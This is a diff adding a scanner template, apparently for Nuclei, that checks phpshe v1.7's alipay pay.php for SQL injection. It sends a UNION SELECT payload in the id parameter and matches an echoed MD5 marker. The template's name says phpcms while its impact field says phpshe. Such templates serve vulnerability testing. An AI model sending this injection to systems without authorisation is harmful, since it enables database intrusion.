@@ -1,0 +1,31 @@
+id: poc-local-cms-phpcms-xray-pay-php-sqli
+
+info:
+  name: poc-local-cms-phpcms-xray-pay-php-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference:
+    - https://www.cnblogs.com/Spec/p/10718046.html
+  metadata:
+    fofa-query: ""
+    Vulnerability-Impact: "phpshe v1.7"
+  tags: phpshe
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+  md5_r1: "{{md5(r1)}}"
+
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,CONCAT%28md5({{r1}})%29,4,5,6,7,8,9,10,11,12%23_"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_r1}}"
+
